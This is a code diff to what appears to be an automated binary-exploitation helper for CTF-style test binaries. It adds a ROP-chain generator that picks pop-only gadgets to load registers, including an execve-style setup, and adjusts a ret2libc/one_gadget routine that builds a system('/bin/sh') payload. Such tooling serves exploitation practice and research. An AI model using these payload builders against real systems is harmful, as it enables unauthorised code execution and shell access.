@@ -36,13 +36,14 @@ class App:
         self.pipe.cmd("aaa")
         self.elf = self.pipe.cmd("aflj")
         
-        one = self.find_one_gadget(binary)
+        #one = self.find_one_gadget(binary)
+        self.generate_rop_chain({"rax":0x3b, "rdi":0xcafebabe, "rsi":0, "rdx":0})
 
     # ================ SOLVE FUNCTIONS ===================
 
     # in my test bins, one_gadget does not want to work
     # ret2libc works though
-    def ret2one(self, binary, one):
+    def ret2one(self, binary, one, add_ret=True):
         io = process(binary) 
 
         vuln = json.loads(self.pipe.cmd("pdfj @ sym.vuln"))
@@ -75,11 +76,18 @@ class App:
             print("[*] Attempting ret2libc")
             payload += p64(pop_rdi)
             payload += p64(next(self.pwnlibc.search("/bin/sh")) + libcoff)
-            payload += p64(ret)
+
+            if add_ret:
+                payload += p64(ret)
+
             payload += p64(self.pwnlibc.sym["system"] + libcoff)
 
         else: 
             print("[*] Attempting one_gadget")
+
+            if add_ret:
+                payload += p64(ret)
+
             payload += p64(one[3] + libcoff)
 
         io.sendlineafter(b">>>", payload)
@@ -315,6 +323,54 @@ class App:
     # =========================== SYMBOLIC SECTION =====================================
 
     # ========================== ROP SECTION ==================================
+
+    # this function will create a ROP chain that populates wanted registers
+    def generate_rop_chain(self, dict_registers):
+        payload = b""
+        completed = []
+
+        for reg in dict_registers.keys():
+            # check if the value has not already been met
+            if reg not in completed:
+                # use a gadget that has only pop in it because if not then it can get risky  
+                use = ""
+
+                for file, gadget in self.rs.search(search=f"pop {reg}"):
+                    tmp = [ i for i in str(gadget).split(";") ]
+                    cool = True
+
+                    for i in tmp:
+                        if "pop" not in i and "ret" not in i and i != " ":
+                            cool = False
+
+                    if cool:
+                        use = str(gadget)
+                        break
+
+                if use == "":
+                    print("[!] Could not find gadget. Trying Angr ROP.")
+                    return None
+
+                # we have found our gadget, now time to add it to our payload
+                payload += p64(int(use.split(":")[0], 16))
+
+                alice = use.split(":")
+                instructions = alice[1].split(";")
+
+                for ins in instructions:
+                    # ins[-3:] is the register popped
+                    if ins[-3:] == "ret":
+                        break
+
+                    if ins[-3:] in dict_registers.keys():
+                        payload += p64(dict_registers[ins[-3:]])
+                        completed.append(ins[-3:])
+
+                    else:
+                        payload += p64(0xdeadbeef)
+
+        return payload
+
 
     # remember to have this only run once and store for all of binaries that need it
     def find_one_gadget(self, binary):
